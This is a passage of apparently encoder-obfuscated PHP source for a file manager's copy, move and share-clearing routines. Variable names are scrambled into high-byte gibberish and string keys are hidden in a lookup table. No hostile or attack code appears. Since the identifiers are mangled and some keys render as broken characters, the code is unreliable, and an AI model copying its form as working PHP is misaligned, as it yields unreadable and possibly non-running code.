$’ôë‡¹— = $this->fileNameExistCache($‚š¦ßè«, $şŞé˜·ë); if ($«ô¥á¢é) { $this->_childrenAllMake($ÍĞã€Ù); if ($±É… â && $’ôë‡¹—) { $this->_childrenAllMake($’ôë‡¹—); } } if (!$’ôë‡¹—) { return $this->_copyCreate($ÍĞã€Ù, $‚š¦ßè«, $şŞé˜·ë, $•âÓ®„Ì); } $õÊª¢÷µ = $’ôë‡¹—; if ($±É… â) { if ($ÂÎ’Çêñ == REPEAT_RENAME_FOLDER) { $şŞé˜·ë = $this->fileNameAutoCache($‚š¦ßè«, $şŞé˜·ë, $ÂÎ’Çêñ, $±É… â); $õÊª¢÷µ = $this->_copyCreate($ÍĞã€Ù, $‚š¦ßè«, $şŞé˜·ë, $•âÓ®„Ì); } else { $ƒ—™‰ = $this->_childrenList($ÍĞã€Ù); foreach ($ƒ—™‰ as $ƒ¿Å“¶) { $this->_copy($ƒ¿Å“¶[$É£ÀˆÜñ[394]], $’ôë‡¹—, $ÂÎ’Çêñ, $•âÓ®„Ì, !1); } } } else { if ($ÂÎ’Çêñ == REPEAT_RENAME || $ÂÎ’Çêñ == REPEAT_RENAME_FOLDER) { $şŞé˜·ë = $this->fileNameAutoCache($‚š¦ßè«, $şŞé˜·ë, $ÂÎ’Çêñ, $±É… â); $õÊª¢÷µ = $this->_copyCreate($ÍĞã€Ù, $‚š¦ßè«, $şŞé˜·ë, $•âÓ®„Ì); } else { if ($ÂÎ’Çêñ == REPEAT_REPLACE) { $ÓÒæèÊø = $this->sourceInfoCache($’ôë‡¹—); $ãš‚‹ø· = $this->fileHistory($ÓÒæèÊø, $Î‹ÇíîÛ[$É£ÀˆÜñ[458]], $Î‹ÇíîÛ[$É£ÀˆÜñ[80]]); if ($ãš‚‹ø·) { $•âÓ®„Ì[$É£ÀˆÜñ[551]][] = $Î‹ÇíîÛ[$É£ÀˆÜñ[458]]; } } else { if ($ÂÎ’Çêñ == REPEAT_SKIP) { } } } Hook::trigger($É£ÀˆÜñ[556], array($É£ÀˆÜñ[557], $Î‹ÇíîÛ, 0)); } return $õÊª¢÷µ; } private function _copyCreate($ëÎº¡ä, $©ÂÕä, $ßİ—µ½à, &$Ä¼Íú·¨) { $‹£Ø´º– =& $_SERVER[® ¨Ä®ñ]; $Ğ¨¯Ô“¯ = $this->sourceInfoCache($ëÎº¡ä); $Ôè›‰‡  = $this->sourceInfoCache($©ÂÕä); $ëÊî®½‰ = $this->_makeItemData($Ğ¨¯Ô“¯, $Ôè›‰‡ , $ßİ—µ½à); Hook::trigger($‹£Ø´º–[558], $ëÊî®½‰); Hook::trigger($‹£Ø´º–[559], array($‹£Ø´º–[560], $ëÊî®½‰, 0)); $Á³»ÁÍ£ = $this->add($ëÊî®½‰); $Ì‰ä¿æÍ = array($‹£Ø´º–[394] => $Á³»ÁÍ£, $‹£Ø´º–[32] => $ßİ—µ½à); $this->_copyApplyMeta($Ì‰ä¿æÍ, $Ä¼Íú·¨); if ($Ğ¨¯Ô“¯[$‹£Ø´º–[402]] != $‹£Ø´º–[89]) { $Ä¼Íú·¨[$‹£Ø´º–[551]][] = $Ğ¨¯Ô“¯[$‹£Ø´º–[458]]; return $Á³»ÁÍ£; } $›ßş¿À = array(); $å¥ò×Öš = array(); $this->_childrenListAll($ëÎº¡ä, $›ßş¿À); $…åğ˜âÙ = count($›ßş¿À); if ($…åğ˜âÙ == 0) { return $Á³»ÁÍ£; } $ÀÅ“âáÒ = $this->sourceInfo($Á³»ÁÍ£); foreach ($›ßş¿À as $İ†™øó) { $ñ¯ú·»Í = $this->_makeItemData($İ†™øó, $ÀÅ“âáÒ, $İ†™øó[$‹£Ø´º–[32]]); $ñ¯ú·»Í[$‹£Ø´º–[512]] = $İ†™øó[$‹£Ø´º–[512]]; $å¥ò×Öš[] = $ñ¯ú·»Í; } $this->chunkEventSet($‹£Ø´º–[561], array($‹£Ø´º–[562], $ëÊî®½‰, $…åğ˜âÙ)); $this->addAll($å¥ò×Öš, array(), !1); $‰ïÀ–›ù = $this->where(array($‹£Ø´º–[489] => $Á³»ÁÍ£))->select(); $½Õé¦´ = $this->_childrenMakeRelation($›ßş¿À, $‰ïÀ–›ù); $½Õé¦´[$ëÎº¡ä] = $Á³»ÁÍ£; $‘şÑè±Ğ = array(); $äÌ—õÚı = array(); foreach ($‰ïÀ–›ù as $İ†™øó) { $Ü•äÒáĞ = $İ†™øó[$‹£Ø´º–[394]]; $•¸¡›Î = $this->_childrenMatch($½Õé¦´, $İ†™øó, $ÀÅ“âáÒ); $‘şÑè±Ğ[] = array($‹£Ø´º–[394], $Ü•äÒáĞ, $‹£Ø´º–[489], $•¸¡›Î[$‹£Ø´º–[489]]); $äÌ—õÚı[] = array($‹£Ø´º–[394], $Ü•äÒáĞ, $‹£Ø´º–[512], $•¸¡›Î[$‹£Ø´º–[512]]); $this->_copyApplyMeta($İ†™øó, $Ä¼Íú·¨); if ($İ†™øó[$‹£Ø´º–[402]] != $‹£Ø´º–[89]) { $Ä¼Íú·¨[$‹£Ø´º–[551]][] = $İ†™øó[$‹£Ø´º–[458]]; } } $this->chunkEventSet($‹£Ø´º–[563], array($‹£Ø´º–[564], $ëÊî®½‰, $…åğ˜âÙ)); $this->saveAll($‘şÑè±Ğ); $this->chunkEventSet($‹£Ø´º–[565], array($‹£Ø´º–[566], $ëÊî®½‰, $…åğ˜âÙ)); $this->saveAll($äÌ—õÚı); return $Á³»ÁÍ£; } private function _childrenMakeRelation($ÖôŸú«ˆ, $½ğ´Ê˜¡) { $¤ğùõğ =& $_SERVER[® ¨Ä®ñ]; $Èİö»Æ = array(); $†éù¹°à = array(); foreach ($ÖôŸú«ˆ as $¦†Äü¤ı) { $è¹ìäØÎ = $¦†Äü¤ı[$¤ğùõğ[32]] . $¤ğùõğ[8] . $¦†Äü¤ı[$¤ğùõğ[512]]; $Èİö»Æ[$è¹ìäØÎ] = $¦†Äü¤ı[$¤ğùõğ[394]]; } foreach ($½ğ´Ê˜¡ as $¦†Äü¤ı) { $è¹ìäØÎ = $¦†Äü¤ı[$¤ğùõğ[32]] . $¤ğùõğ[8] . $¦†Äü¤ı[$¤ğùõğ[512]]; $è‘¹¢œ¥ = $Èİö»Æ[$è¹ìäØÎ]; $†éù¹°à[$è‘¹¢œ¥] = $¦†Äü¤ı[$¤ğùõğ[394]]; } return $†éù¹°à; } private function _childrenMatch($ó®ç®Ş, $¼ôˆÅ—, $Ì“‡âÌˆ) { $ÛéÜíŠ =& $_SERVER[® ¨Ä®ñ]; $‚Œ±‘ø  = $Ì“‡âÌˆ[$ÛéÜíŠ[512]]; $®Ò§˜æß = $this->parentLevelArray($¼ôˆÅ—[$ÛéÜíŠ[512]]); foreach ($®Ò§˜æß as $½Ë¡”ĞÎ) { if (isset($ó®ç®Ş[$½Ë¡”ĞÎ])) { $‚Œ±‘ø  .= $ó®ç®Ş[$½Ë¡”ĞÎ] . $ÛéÜíŠ[567]; } } $‚Œ±‘ø  = rtrim($‚Œ±‘ø , $ÛéÜíŠ[50]) . $ÛéÜíŠ[50]; $„Ü™Œü = $this->parentLevelArray($‚Œ±‘ø ); $Ó¢„ÙŸ’ = $„Ü™Œü[count($„Ü™Œü) - 1]; return array($ÛéÜíŠ[489] => $Ó¢„ÙŸ’, $ÛéÜíŠ[512] => $‚Œ±‘ø ); } private function _makeItemData($ÔèÔÏµÏ, $¦ÃùíÚµ, $÷™Ÿ¨ŠŒ) { $±Ê§ †º =& $_SERVER[® ¨Ä®ñ]; $·½Ï†¼µ = array($±Ê§ †º[568] => $ÔèÔÏµÏ[$±Ê§ †º[402]], $±Ê§ †º[412] => $÷™Ÿ¨ŠŒ, $±Ê§ †º[569] => $ÔèÔÏµÏ[$±Ê§ †º[404]] ? $ÔèÔÏµÏ[$±Ê§ †º[404]] : $±Ê§ †º[12], $±Ê§ †º[459] => $ÔèÔÏµÏ[$±Ê§ †º[458]] ? $ÔèÔÏµÏ[$±Ê§ †º[458]] : 0, $±Ê§ †º[570] => $ÔèÔÏµÏ[$±Ê§ †º[80]] ? $ÔèÔÏµÏ[$±Ê§ †º[80]] : 0, $±Ê§ †º[571] => intval($¦ÃùíÚµ[$±Ê§ †º[403]]), $±Ê§ †º[572] => intval($¦ÃùíÚµ[$±Ê§ †º[495]]), $±Ê§ †º[573] => intval(USER_ID), $±Ê§ †º[574] => intval(USER_ID), $±Ê§ †º[393] => intval($¦ÃùíÚµ[$±Ê§ †º[394]]), $±Ê§ †º[575] => $¦ÃùíÚµ[$±Ê§ †º[512]] . $¦ÃùíÚµ[$±Ê§ †º[394]] . $±Ê§ †º[50], $±Ê§ †º[416] => $ÔèÔÏµÏ[$±Ê§ †º[86]] ? $ÔèÔÏµÏ[$±Ê§ †º[86]] : time(), $±Ê§ †º[421] => 0, $±Ê§ †º[576] => $±Ê§ †º[12]); return $·½Ï†¼µ; } private function _copyApplyMeta($¨¤ÇˆŞš, &$şıüóãÏ) { $©ÎıñåÍ =& $_SERVER[® ¨Ä®ñ]; $Ï¼¡ˆ£ó = $¨¤ÇˆŞš[$©ÎıñåÍ[394]]; $‚³‡¬øÓ = $¨¤ÇˆŞš[$©ÎıñåÍ[32]]; if (!isset($¨¤ÇˆŞš[$©ÎıñåÍ[577]]) || !$¨¤ÇˆŞš[$©ÎıñåÍ[577]] || $¨¤ÇˆŞš[$©ÎıñåÍ[577]] == $©ÎıñåÍ[190]) { $şıüóãÏ[$©ÎıñåÍ[553]][] = array($©ÎıñåÍ[394], $Ï¼¡ˆ£ó, $©ÎıñåÍ[577], short_id($Ï¼¡ˆ£ó)); } if (Input::check($‚³‡¬øÓ, $©ÎıñåÍ[578])) { $şıüóãÏ[$©ÎıñåÍ[552]][] = array($©ÎıñåÍ[394] => $Ï¼¡ˆ£ó, $©ÎıñåÍ[95] => $©ÎıñåÍ[455], $©ÎıñåÍ[369] => str_replace($©ÎıñåÍ[53], $©ÎıñåÍ[12], Pinyin::get($‚³‡¬øÓ))); $şıüóãÏ[$©ÎıñåÍ[552]][] = array($©ÎıñåÍ[394] => $Ï¼¡ˆ£ó, $©ÎıñåÍ[95] => $©ÎıñåÍ[454], $©ÎıñåÍ[369] => Pinyin::get($‚³‡¬øÓ, $©ÎıñåÍ[579])); } $şıüóãÏ[$©ÎıñåÍ[552]][] = array($©ÎıñåÍ[394] => $Ï¼¡ˆ£ó, $©ÎıñåÍ[95] => $©ÎıñåÍ[433], $©ÎıñåÍ[369] => KodSort::makeStr($‚³‡¬øÓ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ƒ‹Å§Ü) { $’úËìşò =& $_SERVER[® ¨Ä®ñ]; $ÃÒÊï´— = $this->sourceInfo($ƒ‹Å§Ü); $¯Ô¬ç§ñ = $’úËìşò[580]; $î¦³Âú™ = array($’úËìşò[512] => array($’úËìşò[535], $ÃÒÊï´—[$’úËìşò[512]] . $ƒ‹Å§Ü . $’úËìşò[536]), $’úËìşò[422] => $this->targetIsDelete); $±¿³¤Ş… = $this->field($¯Ô¬ç§ñ)->where($î¦³Âú™)->select(); if (!$±¿³¤Ş…) { return; } $±¿³¤Ş… = array_to_keyvalue($±¿³¤Ş…, $’úËìşò[394]); foreach ($±¿³¤Ş… as $Ã±‘ÆÔ¤) { $—°ùƒ© = $Ã±‘ÆÔ¤[$’úËìşò[489]]; $ƒ‹Å§Ü = $Ã±‘ÆÔ¤[$’úËìşò[394]]; if (!isset($this->_childrenListCache[$ƒ‹Å§Ü]) && $Ã±‘ÆÔ¤[$’úËìşò[402]] == $’úËìşò[89]) { $this->_childrenListCache[$ƒ‹Å§Ü] = array(); } if (!isset($this->_childrenListCache[$—°ùƒ©])) { $this->_childrenListCache[$—°ùƒ©] = array(); } $this->_childrenListCache[$—°ùƒ©][$ƒ‹Å§Ü] = $Ã±‘ÆÔ¤; $this->_childrenItemCache[$ƒ‹Å§Ü] = $Ã±‘ÆÔ¤; } } private function _childrenListAll($Ã½¨›¦©, &$œ‰Ü°ä­) { $êéşğ¿ê =& $_SERVER[® ¨Ä®ñ]; if (!isset($this->_childrenListCache[$Ã½¨›¦©])) { return; } $€Î×¬»ì = $this->_childrenListCache[$Ã½¨›¦©]; foreach ($€Î×¬»ì as $—–Êšœ› => $ÆúŠÇ†˜) { $œ‰Ü°ä­[$—–Êšœ›] = $ÆúŠÇ†˜; if ($ÆúŠÇ†˜[$êéşğ¿ê[402]] == $êéşğ¿ê[89]) { $this->_childrenListAll($—–Êšœ›, $œ‰Ü°ä­); } } } private function sourceInfoCache($ïşĞ¬ğØ) { if (isset($this->_childrenItemCache[$ïşĞ¬ğØ])) { return $this->_childrenItemCache[$ïşĞ¬ğØ]; } return $this->sourceInfo($ïşĞ¬ğØ); } private function _childrenList($Ş‹Ø²ƒ²) { if (isset($this->_childrenListCache[$Ş‹Ø²ƒ²])) { return $this->_childrenListCache[$Ş‹Ø²ƒ²]; } return $this->_childrenListSelect($Ş‹Ø²ƒ²); } private function _childrenListSelect($ñ€¢¦ª) { $Ü ã˜–ğ =& $_SERVER[® ¨Ä®ñ]; $Ùış¶ğğ = array($Ü ã˜–ğ[489] => $ñ€¢¦ª, $Ü ã˜–ğ[422] => $this->targetIsDelete); $Â—¨×Š” = $this->where($Ùış¶ğğ)->select(); $Â—¨×Š” = $Â—¨×Š” ? $Â—¨×Š” : array(); $ìŠÎİç = array_to_keyvalue($Â—¨×Š”, $Ü ã˜–ğ[394]); $this->_childrenListCache[$ñ€¢¦ª] = $ìŠÎİç; foreach ($ìŠÎİç as $ñ€¢¦ª => $™Ï›‹¨×) { $this->_childrenItemCache[$ñ€¢¦ª] = $™Ï›‹¨×; } return $ìŠÎİç; } private function fileNameExistCache($î˜ëŞ¿Õ, $À‚½‡ŞÙ) { $üƒàı„Ü =& $_SERVER[® ¨Ä®ñ]; $À‚½‡ŞÙ = strtolower($À‚½‡ŞÙ); $çôûÍ = $this->_childrenList($î˜ëŞ¿Õ); foreach ($çôûÍ as $½±Ó½çé) { if ($À‚½‡ŞÙ == strtolower($½±Ó½çé[$üƒàı„Ü[32]])) { return $½±Ó½çé[$üƒàı„Ü[394]]; } } return !1; } private function fileNameAutoCache($üÖâïğ¤, $Û®¯Öì§, $©•Ãë‹Ñ, $ÇıÂÖÖ‡) { $Ê×—¨Ï‘ =& $_SERVER[® ¨Ä®ñ]; $èûÅ›ŠÍ = $this->_childrenList($üÖâïğ¤); $Í ¶¬‰‡ = array_to_keyvalue($èûÅ›ŠÍ, $Ê×—¨Ï‘[12], $Ê×—¨Ï‘[32]); return $this->fileNameAutoGet($Í ¶¬‰‡, $Û®¯Öì§, $©•Ãë‹Ñ, $ÇıÂÖÖ‡); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($û©¥ÍŒ, $ãŸ«‚ó, $ş ´œÇ³ = REPEAT_REPLACE, $Â¾¿µ‚Å = '') { $¶«²ÜÏ =& $_SERVER[® ¨Ä®ñ]; $»€Ï¸è´ = $this->sourceInfo($û©¥ÍŒ); $ßà’ÏÌº = $this->sourceInfo($ãŸ«‚ó); if ($»€Ï¸è´[$¶«²ÜÏ[489]] == $ßà’ÏÌº[$¶«²ÜÏ[394]]) { if ($»€Ï¸è´[$¶«²ÜÏ[422]] == $¶«²ÜÏ[89]) { Model($¶«²ÜÏ[420])->restore(array($û©¥ÍŒ)); } if (!$Â¾¿µ‚Å || $Â¾¿µ‚Å == $»€Ï¸è´[$¶«²ÜÏ[32]]) { return $û©¥ÍŒ; } } $ºŒ×Ö„Í = $this->pathInfoMore($û©¥ÍŒ); if ($this->isParentOf($û©¥ÍŒ, $ãŸ«‚ó)) { return !1; } if (!$»€Ï¸è´ || !$ßà’ÏÌº || $ßà’ÏÌº[$¶«²ÜÏ[402]] != $¶«²ÜÏ[89]) { return !1; } Hook::trigger($¶«²ÜÏ[581], $ºŒ×Ö„Í); $this->targetIsDelete = intval($»€Ï¸è´[$¶«²ÜÏ[422]]); if ($»€Ï¸è´[$¶«²ÜÏ[489]] == $ãŸ«‚ó && $Â¾¿µ‚Å != $»€Ï¸è´[$¶«²ÜÏ[32]]) { $Û–¤èÜ· = $this->fileNameExist($ãŸ«‚ó, $Â¾¿µ‚Å); if ($Û–¤èÜ· && $»€Ï¸è´[$¶«²ÜÏ[402]] == $¶«²ÜÏ[190]) { $¤Õ¡©› = $this->sourceInfo($Û–¤èÜ·); $¢”™Úƒì = $this->fileHistory($¤Õ¡©›, $»€Ï¸è´[$¶«²ÜÏ[458]], $»€Ï¸è´[$¶«²ÜÏ[80]]); if (!$¢”™Úƒì) { Model($¶«²ÜÏ[461])->remove($»€Ï¸è´[$¶«²ÜÏ[458]]); } $this->removeNow($û©¥ÍŒ, !1); $this->folderSizeReset($ãŸ«‚ó); Hook::trigger($¶«²ÜÏ[582], $ºŒ×Ö„Í); return $Û–¤èÜ·; } } $½«ªùÃ = $Â¾¿µ‚Å ? $Â¾¿µ‚Å : $»€Ï¸è´[$¶«²ÜÏ[32]]; $this->lockMoveStart($û©¥ÍŒ); $this->lockWriteStart($ãŸ«‚ó, $½«ªùÃ); $Íê¯ÄÓå = array($¶«²ÜÏ[551] => array(), $¶«²ÜÏ[583] => !1); $this->clearShare($û©¥ÍŒ, $ãŸ«‚ó); $òÁ…­Éã = $this->fileNameExistCache($ãŸ«‚ó, $»€Ï¸è´[$¶«²ÜÏ[32]]); $İñ¶ÖÅ = $this->_move($û©¥ÍŒ, $ãŸ«‚ó, $ş ´œÇ³, $Íê¯ÄÓå, $Â¾¿µ‚Å); $this->sourceCacheClear(); if ($»€Ï¸è´[$¶«²ÜÏ[402]] == $¶«²ÜÏ[89] && $òÁ…­Éã) { $this->folderSizeResetChildren($İñ¶ÖÅ); } Model($¶«²ÜÏ[192])->linkAdd($Íê¯ÄÓå[$¶«²ÜÏ[551]]); if ($òÁ…­Éã && $Íê¯ÄÓå[$¶«²ÜÏ[583]]) { $this->removeNow($û©¥ÍŒ, !1); } $this->lockMoveEnd($û©¥ÍŒ); $this->lockWriteEnd($ãŸ«‚ó, $½«ªùÃ); $this->folderSizeReset($»€Ï¸è´[$¶«²ÜÏ[489]]); $this->folderSizeReset($ãŸ«‚ó); $ùÃ‡Å”´ = array($»€Ï¸è´[$¶«²ÜÏ[489]], $ãŸ«‚ó); if ($»€Ï¸è´[$¶«²ÜÏ[402]] == $¶«²ÜÏ[89]) { $ùÃ‡Å”´[] = $û©¥ÍŒ; } $this->updateModifyTime($ùÃ‡Å”´); Model($¶«²ÜÏ[555])->eventMove($û©¥ÍŒ, $»€Ï¸è´[$¶«²ÜÏ[489]], $ãŸ«‚ó); Hook::trigger($¶«²ÜÏ[582], $ºŒ×Ö„Í); return $İñ¶ÖÅ; } private function _move($µ™áëÁ, $ÉÄÌı¬, $ò·ÑŒ•ñ, &$”Ö²òùº, $ÇÁö”æ± = '') { $‚ƒÛ™ÖÇ =& $_SERVER[® ¨Ä®ñ]; $ï«…íˆ = $this->sourceInfo($µ™áëÁ); $Ôª­Ø = $ï«…íˆ[$‚ƒÛ™ÖÇ[402]] == $‚ƒÛ™ÖÇ[89]; $ß¬ÙÀ… = $ÇÁö”æ± ? $ÇÁö”æ± : $ï«…íˆ[$‚ƒÛ™ÖÇ[32]]; $´ıê…õ = $this->fileNameExistCache($ÉÄÌı¬, $ß¬ÙÀ…); $this->lockMoveStart($µ™áëÁ); $this->lockWriteStart($ÉÄÌı¬, $ß¬ÙÀ…); if (!$´ıê…õ) { return $this->_moveForce($µ™áëÁ, $ÉÄÌı¬, $ß¬ÙÀ…); } $ì‡¸ú¼ = $´ıê…õ; $¤âª« Œ = !1; if ($Ôª­Ø) { if ($ò·ÑŒ•ñ == REPEAT_RENAME_FOLDER) { $ß¬ÙÀ… = $this->fileNameAuto($ÉÄÌı¬, $ß¬ÙÀ…, $ò·ÑŒ•ñ, $Ôª­Ø); $ì‡¸ú¼ = $this->_moveForce($µ™áëÁ, $ÉÄÌı¬, $ß¬ÙÀ…); } else { if ($ò·ÑŒ•ñ == REPEAT_RENAME_FOLDER) { $ò·ÑŒ•ñ = REPEAT_RENAME; } $¾ôÈ§ö = $this->_childrenListSelect($µ™áëÁ); foreach ($¾ôÈ§ö as $¹²êçç¨) { $this->_move($¹²êçç¨[$‚ƒÛ™ÖÇ[394]], $´ıê…õ, $ò·ÑŒ•ñ, $”Ö²òùº); } $¤âª« Œ = !0; } } else { if ($ò·ÑŒ•ñ == REPEAT_SKIP) { $¤âª« Œ = !0; } else { if ($ò·ÑŒ•ñ == REPEAT_RENAME || $ò·ÑŒ•ñ == REPEAT_RENAME_FOLDER) { $ß¬ÙÀ… = $this->fileNameAuto($ÉÄÌı¬, $ß¬ÙÀ…, $ò·ÑŒ•ñ, $Ôª­Ø); $ì‡¸ú¼ = $this->_moveForce($µ™áëÁ, $ÉÄÌı¬, $ß¬ÙÀ…); } else { if ($ò·ÑŒ•ñ == REPEAT_REPLACE) { $ƒæß½îó = $this->sourceInfoCache($´ıê…õ); $ÈÄ‰ìî‹ = $this->fileHistory($ƒæß½îó, $ï«…íˆ[$‚ƒÛ™ÖÇ[458]], $ï«…íˆ[$‚ƒÛ™ÖÇ[80]]); $¤âª« Œ = !0; if ($ÈÄ‰ìî‹) { $”Ö²òùº[$‚ƒÛ™ÖÇ[551]][] = $ï«…íˆ[$‚ƒÛ™ÖÇ[458]]; } } } } } if ($¤âª« Œ && !$”Ö²òùº[$‚ƒÛ™ÖÇ[583]]) { $”Ö²òùº[$‚ƒÛ™ÖÇ[583]] = !0; } return $ì‡¸ú¼; } private function _moveForce($¿¶±ú÷, $æ·²ÕÍ†, $Ğ“öÏ¹) { $ü´›í›â =& $_SERVER[® ¨Ä®ñ]; $çŠÀâ“µ = $this->sourceInfo($¿¶±ú÷); $ºï´Ä°Ö = $this->sourceInfo($æ·²ÕÍ†); $óêÎØËª = $çŠÀâ“µ[$ü´›í›â[402]] == $ü´›í›â[89]; $›¬ÏÒ = array($ü´›í›â[393] => $ºï´Ä°Ö[$ü´›í›â[394]], $ü´›í›â[575] => $ºï´Ä°Ö[$ü´›í›â[512]] . $ºï´Ä°Ö[$ü´›í›â[394]] . $ü´›í›â[50], $ü´›í›â[571] => $ºï´Ä°Ö[$ü´›í›â[403]], $ü´›í›â[572] => $ºï´Ä°Ö[$ü´›í›â[495]], $ü´›í›â[574] => USER_ID, $ü´›í›â[412] => $Ğ“öÏ¹); $Ìëò²¨£ = $çŠÀâ“µ[$ü´›í›â[403]] == SourceModel::TYPE_GROUP && $ºï´Ä°Ö[$ü´›í›â[403]] == SourceModel::TYPE_GROUP && $çŠÀâ“µ[$ü´›í›â[495]] == $ºï´Ä°Ö[$ü´›í›â[495]]; if (!$Ìëò²¨£ && $this->moveClearAuth) { Model($ü´›í›â[493])->authClear($¿¶±ú÷); } $ğŸ€ŠÖ¶ = $çŠÀâ“µ[$ü´›í›â[422]] == $ü´›í›â[89] && $ºï´Ä°Ö[$ü´›í›â[422]] != $ü´›í›â[89]; if ($ğŸ€ŠÖ¶) { $›¬ÏÒ[$ü´›í›â[421]] = 0; } if ($óêÎØËª) { $ÄÇ™Û”ş = array($ü´›í›â[575] => array($ü´›í›â[535], $çŠÀâ“µ[$ü´›í›â[512]] . $çŠÀâ“µ[$ü´›í›â[394]] . $ü´›í›â[536])); $¬î‡­²ƒ = $çŠÀâ“µ[$ü´›í›â[512]] . $çŠÀâ“µ[$ü´›í›â[394]] . $ü´›í›â[50]; $³“’äÈ = $ºï´Ä°Ö[$ü´›í›â[512]] . $ºï´Ä°Ö[$ü´›í›â[394]] . $ü´›í›â[50] . $çŠÀâ“µ[$ü´›í›â[394]] . $ü´›í›â[50]; $ªñÁ²ÖŠ = array($ü´›í›â[575] => array($ü´›í›â[584], "\x72\145\160\x6c\x61\x63\x65\x28\x70\141\162\145\x6e\x74\114\145\166\x65\x6c\x2c\x27{$¬î‡­²ƒ}\x27\x2c\x27{$³“’äÈ}\47\x29"), $ü´›í›â[571] => $ºï´Ä°Ö[$ü´›í›â[403]], $ü´›í›â[572] => $ºï´Ä°Ö[$ü´›í›â[495]]); if ($ğŸ€ŠÖ¶) { $ªñÁ²ÖŠ[$ü´›í›â[421]] = 0; } $this->where($ÄÇ™Û”ş)->data($ªñÁ²ÖŠ)->save(); } $this->where(array($ü´›í›â[409] => $¿¶±ú÷))->data($›¬ÏÒ)->save(); return $¿¶±ú÷; } private function clearShare($ÌğÖñàê, $Ã¤Ë­ğ) { $İ¼ˆ÷±± =& $_SERVER[® ¨Ä®ñ]; $î´É§èã = $this->sourceInfo($ÌğÖñàê); $÷¥ı¢şç = $this->sourceInfo($Ã¤Ë­ğ); if ($î´É§èã[$İ¼ˆ÷±±[495]] == $÷¥ı¢şç[$İ¼ˆ÷±±[495]] && $î´É§èã[$İ¼ˆ÷±±[403]] == $İ¼ˆ÷±±[585]) { return; } $ä®ØŸë‹ = array($İ¼ˆ÷±±[512] => array($İ¼ˆ÷±±[535], $î´É§èã[$İ¼ˆ÷±±[512]] . $ÌğÖñàê . $İ¼ˆ÷±±[536])); $Ó¦ëÁô÷ = $this->field($İ¼ˆ÷±±[409])->where($ä®ØŸë‹)->getField($İ¼ˆ÷±±[394], !0); if (!$Ó¦ëÁô÷) { return; } $ä®ØŸë‹ = array($İ¼ˆ÷±±[394] => array($İ¼ˆ÷±±[7], $Ó¦ëÁô÷), $İ¼ˆ÷±±[486] => 1); $Ä¤èÔŸÌ = Model($İ¼ˆ÷±±[586])->field($İ¼ˆ÷±±[479])->where($ä®ØŸë‹)->select(); if (!$Ä¤èÔŸÌ) { return; } $Ä¤èÔŸÌ = array_to_keyvalue($Ä¤èÔŸÌ, $İ¼ˆ÷±±[12], $İ¼ˆ÷±±[479]); $ä®ØŸë‹ = array($İ¼ˆ÷±±[479] => array($İ¼ˆ÷±±[7], $Ä¤èÔŸÌ)); Model($İ¼ˆ÷±±[586])->where($ä®ØŸë‹)->save(array($İ¼ˆ÷±±[486] => 0)); Model($İ¼ˆ÷±±[587])->where($ä®ØŸë‹)->delete(); } public function copyFolderFromIO($¨çÖâÒ´, $¦÷¶»Ã, $²Õ‘˜îè, $È¥ÛŠèË, $ß‚ÜıİÊ, $À³¤˜¿® = false) { $éœ÷Õ¡Ì =& $_SERVER[® ¨Ä®ñ]; $Üç¬¶œñ = array($éœ÷Õ¡Ì[552] => array(), $éœ÷Õ¡Ì[553] => array(), $éœ÷Õ¡Ì[551] => array(), $éœ÷Õ¡Ì[588] => array()); $§“ï€Çı = $À³¤˜¿® ? $À³¤˜¿® : $¨çÖâÒ´->pathThis($¦÷¶»Ã); $–åŒÏ = $this->fileNameExist($²Õ‘˜îè, $§“ï€Çı); $ñÂ¿ò™· = $this->mkdir($²Õ‘˜îè, $§“ï€Çı, $È¥ÛŠèË); if (!$–åŒÏ || $È¥ÛŠèË == REPEAT_RENAME_FOLDER) { $È¥ÛŠèË = !1; } if ($–åŒÏ) { $this->_childrenAllMake($–åŒÏ); } Hook::trigger($éœ÷Õ¡Ì[589]); $this->_copyChildTo($¨çÖâÒ´, $¦÷¶»Ã, $ñÂ¿ò™·, $È¥ÛŠèË, $Üç¬¶œñ, $ß‚ÜıİÊ); Hook::trigger($éœ÷Õ¡Ì[590]); if ($ñÂ¿ò™·) { $this->folderSizeResetChildren($ñÂ¿ò™·); } $this->_childrenListClear(); Model($éœ÷Õ¡Ì[554])->addAll($Üç¬¶œñ[$éœ÷Õ¡Ì[552]], array(), !0); Model($éœ÷Õ¡Ì[555])->eventCopy($ñÂ¿ò™·); $this->saveAll($Üç¬¶œñ[$éœ÷Õ¡Ì[553]]); Model($éœ÷Õ¡Ì[461])->linkAdd($Üç¬¶œñ[$éœ÷Õ¡Ì[551]]); Model($éœ÷Õ¡Ì[461])->remove($Üç¬¶œñ[$éœ÷Õ¡Ì[588]]); $this->folderSizeReset($²Õ‘˜îè); $this->updateModifyTime($²Õ‘˜îè); return $ñÂ¿ò™·; } private function _copyChildTo($†îŸÔñã, $‚ıÉ‘Æò, $¬Æ¬•öü, $†•ãÄ®Õ, &$†è³¼ÅÕ, $í©Òü”) { $¯·¸‹•ç =& $_SERVER[® ¨Ä®ñ]; $ï»«Ÿşñ = $this->sourceInfoCache($¬Æ¬•öü); $õ±ïğ‡Ã = $†îŸÔñã->listPath($‚ıÉ‘Æò); $õ±ïğ‡Ã = $õ±ïğ‡Ã ? $õ±ïğ‡Ã : array($¯·¸‹•ç[76] => array(), $¯·¸‹•ç[77] => array()); $”øııŸ¦ = array_merge($õ±ïğ‡Ã[$¯·¸‹•ç[76]], $õ±ïğ‡Ã[$¯·¸‹•ç[77]]); $ÂÙÚ‡ä = $this->_addFiles($†îŸÔñã, $õ±ïğ‡Ã[$¯·¸‹•ç[76]], $í©Òü”); $–û—Îµ± = array(); foreach ($”øııŸ¦ as &$¡±ŒÎ¢ä) { if (isset($ÂÙÚ‡ä[$¡±ŒÎ¢ä[$¯·¸‹•ç[32]]])) { $¡±ŒÎ¢ä = $ÂÙÚ‡ä[$¡±ŒÎ¢ä[$¯·¸‹•ç[32]]]; } $¡±ŒÎ¢ä[$¯·¸‹•ç[402]] = $¡±ŒÎ¢ä[$¯·¸‹•ç[33]] == $¯·¸‹•ç[79]; $¡±ŒÎ¢ä[$¯·¸‹•ç[404]] = _get($¡±ŒÎ¢ä, $¯·¸‹•ç[167], $¯·¸‹•ç[12]); $¡±ŒÎ¢ä[$¯·¸‹•ç[80]] = _get($¡±ŒÎ¢ä, $¯·¸‹•ç[80], 0); $¡±ŒÎ¢ä[$¯·¸‹•ç[458]] = _get($¡±ŒÎ¢ä, 